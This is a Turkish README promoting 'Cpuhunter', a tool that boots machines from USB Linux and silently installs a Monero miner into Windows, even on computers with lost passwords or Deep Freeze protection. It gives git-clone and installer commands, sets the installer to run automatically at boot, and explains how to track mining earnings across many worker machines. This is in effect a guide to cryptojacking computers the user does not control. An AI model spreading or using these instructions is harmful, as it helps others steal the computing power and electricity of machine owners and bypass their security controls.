# Cpuhunter

![Usb live linux 2 windows monero miner](https://image.ibb.co/gPWncJ/usb_linux_100672302_primary_idge.jpg)

Şifresi kaybolmuş ya da deep freeze yüklü olsa bile istisnasız tüm bilgisayarlar birer para basma makinasıdır. 

Bırakın bilgisayarlar sizin için çalışsın. 

# Neler gerekli

* Monero cüzdan adresi (Ödemelerinizi almak için, [Mymonero.com](https://mymonero.com) adresinden kolayca oluşturabilirsiniz). 
* Usb bellek (en az 4gb). 

# Kurulum seçenekleri

İki ayrı kurulum seçeneği bulunmaktadır. 

# 1- Herşey hazır imaj dosyasını indirin (kolay kurulum) (torrent indirmesi)

### İmaj dosyasını indirin
[Cpuhunter Os imaj dosyası](https://rebrand.ly/cpuhunter_os)nı indirin ve [Win32 Disk Imager](https://sourceforge.net/projects/win32diskimager/) programı ile usb'ye yazdırın. Daha sonrasında bilgisayarınızı hazırlamış olduğunuz usb'den boot edin. 

### Linux komut satırına (terminal) aşağıdaki komutu girin:
```
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

Artık her şey hazır. 

İlk kurulumda monero cüzdanınızı kaydetmeniz istenecek. Bu işlemi geçtikten sonra Linux'ten Windows'a monero miner yazılımını yüklemek için usb'den yeniden başlatmanız yeterlidir. Sistem başlangıcında yükleme işlemleri otomatik olarak başlayacaktır.


# 2- Kendi hazırladığınız bootable usb linuxe yükleyin (profesyoneller için) 

### İndirme / güncelleme komutu: 

```
sudo apt-get install python3 geany
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

### Çalıştırma komutu:
```
python3 /$USER/cpuhunter/exeinstaller.py
```
Çalıştırma komutunu başlangıca eklerseniz imaj dosyasında olduğu gibi bilgisayar açıldığında yazılım otomatik olarak işlem yapmaya başlayacaktır. 

# Monero cüzdanı nereye kaydedilecek?
Bilgisayarı usb'den boot ettiğinizde karşınıza otomatik olarak config.json dosyası açılacak. Wallet kısmı karşısına monero cüzdanınızı girmeniz yeterlidir. 

# Kazançların takibi

 ### Online pc listesi
 İstatistiklere ortalama 15 dk içerisinde yansır
 ```
 reed171.com/h.aspx?wallet=monero_adresiniz
```

 ### Nanopool kazanç takip adresi
 İstatistiklere ortalama 40 dk içerisinde yansır
 ```
 xmr.nanopool.org/account/monero_adresiniz
```
 [Örnek rapor](https://xmr.nanopool.org/account/46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S)

Örnek göstergeler
==================

### Hashsrate istatistikleri:
![](https://image.ibb.co/mSdKWd/hashrateler.png)

### Workers'lar:
![](https://image.ibb.co/h0L54y/ornek_kullanim.png)

# Ödemelerin alınması
1 monero kazandığınızda [mymonero.com](https://mymonero.com) hesabınıza geçecektir. Dolar'a ya da TL'ye çevirip banka hesabınıza aktarabilirsiniz. 

# Ek açıklamalar
* ÖNEMLİ: Bilgisayara yüklendikten sonra takip adresinde gözükmesi biraz zaman alabilir. Bunun nedeni Nanopool ilk hashrate ile değil kabul edilen ilk hashrate sonrası bilgisayarı sisteme yansıtıyor. 

* Monero neredeyse tüm borsalarda işlem görmekte olan gizliliğe dayalı güvenilir bir altcoindir. Gelecekte de fiyatının oldukça artması beklenmektedir. 
* Mining yazılımına otomatik güncelleme desteği eklenmiştir. Yani monero bazı durumlarda algoritmasını değiştirir ve eski yazılımlar işlevsiz hale gelir. Bu tarz durumlarda mining yazılımı otomatik olarak güncellenecektir. 
* Geliştirici komisyonu %1'dir. Mymonero.com ya da Nanopool.com kazançlarınızdan düşmemektedir. 
* Worker id'ler otomatik olarak oluşturulmaktadır. 
* Ne kadar kazanç elde ettiğinizi detaylı olarak takip edebilirsiniz. 
* Linux'te gerekli işlem yapıldığında yazılımın Windows'a başarılı bir şekilde yüklendiği sağ üst köşede çıkan bildirimden anlaşılabilir. 
  * "+" işareti başarılı "-" işareti ise başarısız olduğu anlamına gelir.  
  * İşlem detayları log klasörüne kaydedilir. 
* <strike>Başlangıçta çalışması istenilen programlar run klasörüne kopyalanabilir.</strike> (Pro Özellik)
* Programı bilgisayardan silmek için linux terminale aşağıdaki komutu girin:
```
python3 /$USER/cpuhunter/exeinstaller.py remove_all
```

   # Pro Version 
 Pro Version'u http://bit.ly/CpuhunterPro adresinden satın alabilirsiniz. 
 
  # Discord
 Kullanıcılar tarafından oluşturulan gönüllü destek grubuna katılın
 https://discord.gg/FvwUjKX

  # Projeyi Destekle
* Xmr: 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS5q4EZwra66S4TQFdY
